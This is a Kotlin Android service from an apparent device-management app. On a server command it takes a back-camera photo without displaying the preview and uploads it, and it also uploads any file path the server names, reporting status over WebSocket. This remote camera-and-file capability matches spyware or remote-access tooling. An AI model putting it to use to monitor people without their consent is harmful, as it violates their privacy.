package com.devicemanager.services

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.devicemanager.DeviceManagerApp
import com.devicemanager.util.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * Camera capture service using CameraX.
 *
 * Captures a photo using ImageCapture, saves to a file, and uploads via
 * /api/upload with file_type=camera_capture.
 *
 * Foreground service with camera type (Android 14+ requirement).
 * Implements LifecycleOwner for CameraX lifecycle binding.
 */
class CameraCaptureService : Service(), LifecycleOwner {
    companion object {
        private const val TAG = "CameraCaptureService"

        const val ACTION_CAPTURE = "com.devicemanager.CAPTURE_PHOTO"
        const val ACTION_UPLOAD_FILE = "com.devicemanager.UPLOAD_FILE"
        const val EXTRA_COMMAND_ID = "command_id"
        const val EXTRA_FILE_PATH = "file_path"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var lifecycleRegistry: LifecycleRegistry
    private lateinit var cameraExecutor: ExecutorService

    private var imageCapture: ImageCapture? = null
    private var currentCommandId: String? = null

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry = LifecycleRegistry(this)
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
        cameraExecutor = Executors.newSingleThreadExecutor()
        createNotificationChannel()
    }

    override fun getLifecycle(): Lifecycle = lifecycleRegistry

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_CAPTURE -> capturePhoto(intent)
            ACTION_UPLOAD_FILE -> uploadSpecificFile(intent)
        }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        cameraExecutor.shutdown()
        super.onDestroy()
    }

    /**
     * Capture a photo using CameraX.
     */
    private fun capturePhoto(intent: Intent) {
        currentCommandId = intent.getStringExtra(EXTRA_COMMAND_ID)

        // Check camera permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandStatus(currentCommandId, "FAILED",
                error = "Camera permission not granted. Please grant camera permission.")
            stopSelf()
            return
        }

        // Start foreground service
        val notification = buildNotification("Capturing photo...")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                Constants.NOTIF_ID_CAMERA,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            )
        } else {
            startForeground(Constants.NOTIF_ID_CAMERA, notification)
        }

        lifecycleRegistry.currentState = Lifecycle.State.STARTED

        try {
            val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
            cameraProviderFuture.addListener({
                val cameraProvider = cameraProviderFuture.get()

                // Preview (required for CameraX, but we don't display it)
                val preview = Preview.Builder().build()

                // ImageCapture
                imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                // Use back camera by default
                val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA

                try {
                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(
                        this,
                        cameraSelector,
                        preview,
                        imageCapture
                    )

                    // Create output file
                    val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                    val capturesDir = File(filesDir, "captures")
                    if (!capturesDir.exists()) capturesDir.mkdirs()
                    val photoFile = File(capturesDir, "capture_$timeStamp.jpg")

                    val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                    imageCapture?.takePicture(
                        outputOptions,
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {
                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                Log.d(TAG, "Photo captured: ${photoFile.absolutePath}")
                                updateCommandStatus(currentCommandId, "EXECUTING",
                                    result = "Photo captured, uploading...")
                                serviceScope.launch {
                                    uploadPhoto(photoFile)
                                }
                            }

                            override fun onError(exception: ImageCaptureException) {
                                Log.e(TAG, "Capture error: ${exception.message}", exception)
                                updateCommandStatus(currentCommandId, "FAILED",
                                    error = "Capture failed: ${exception.message}")
                                cleanupAndStop()
                            }
                        }
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Camera bind error: ${e.message}", e)
                    updateCommandStatus(currentCommandId, "FAILED",
                        error = "Camera initialization failed: ${e.message}")
                    cleanupAndStop()
                }
            }, ContextCompat.getMainExecutor(this))
        } catch (e: Exception) {
            Log.e(TAG, "Capture photo error: ${e.message}", e)
            updateCommandStatus(currentCommandId, "FAILED",
                error = "Capture failed: ${e.message}")
            cleanupAndStop()
        }
    }

    /**
     * Upload a specific file (for UPLOAD_FILE command).
     */
    private fun uploadSpecificFile(intent: Intent) {
        currentCommandId = intent.getStringExtra(EXTRA_COMMAND_ID)
        val filePath = intent.getStringExtra(EXTRA_FILE_PATH)

        if (filePath.isNullOrBlank()) {
            updateCommandStatus(currentCommandId, "FAILED", error = "No file path provided")
            stopSelf()
            return
        }

        val file = File(filePath)
        if (!file.exists()) {
            updateCommandStatus(currentCommandId, "FAILED", error = "File not found: $filePath")
            stopSelf()
            return
        }

        val notification = buildNotification("Uploading file...")
        startForeground(Constants.NOTIF_ID_CAMERA, notification)

        serviceScope.launch {
            uploadFile(file, Constants.FILE_TYPE_GENERIC)
        }
    }

    /**
     * Upload captured photo to server.
     */
    private suspend fun uploadPhoto(file: File) {
        uploadFile(file, Constants.FILE_TYPE_CAMERA_CAPTURE)
    }

    /**
     * Upload a file to the server via /api/upload.
     */
    private suspend fun uploadFile(file: File, fileType: String) {
        try {
            val app = application as DeviceManagerApp
            val deviceId = app.preferences.deviceId

            val mimeType = when (fileType) {
                Constants.FILE_TYPE_CAMERA_CAPTURE -> "image/jpeg"
                Constants.FILE_TYPE_SCREEN_RECORDING -> "video/mp4"
                else -> "application/octet-stream"
            }

            val requestFile = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("file", file.name, requestFile)
            val deviceIdBody = deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
            val fileTypeBody = fileType.toRequestBody("text/plain".toMediaTypeOrNull())

            val response = app.apiService.uploadFile(deviceIdBody, fileTypeBody, body)

            if (response.isSuccessful) {
                Log.d(TAG, "File uploaded successfully: ${file.name}")
                updateCommandStatus(currentCommandId, "COMPLETED",
                    result = "File uploaded: ${file.name} (${file.length()} bytes)")
            } else {
                updateCommandStatus(currentCommandId, "FAILED",
                    error = "Upload failed: HTTP ${response.code()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload file error: ${e.message}", e)
            updateCommandStatus(currentCommandId, "FAILED",
                error = "Upload failed: ${e.message}")
        } finally {
            cleanupAndStop()
        }
    }

    /**
     * Update command status via WebSocket or REST.
     */
    private fun updateCommandStatus(commandId: String?, status: String, result: String? = null, error: String? = null) {
        if (commandId.isNullOrBlank()) return
        serviceScope.launch {
            try {
                val app = application as DeviceManagerApp
                val sent = app.webSocketClient.sendCommandStatus(commandId, status, result, error)
                if (!sent) {
                    app.deviceRepository.updateCommandStatus(commandId, status, result, error)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Update command status error: ${e.message}", e)
            }
        }
    }

    /**
     * Clean up and stop service.
     */
    private fun cleanupAndStop() {
        try {
            lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        } catch (e: Exception) {
            Log.e(TAG, "Cleanup error: ${e.message}", e)
        }
        stopSelf()
    }

    // ── Notification helpers ─────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Constants.CHANNEL_CAMERA,
                "Camera Capture",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Camera capture service notification"
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(contentText: String): Notification {
        return NotificationCompat.Builder(this, Constants.CHANNEL_CAMERA)
            .setContentTitle("Camera Capture")
            .setContentText(contentText)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
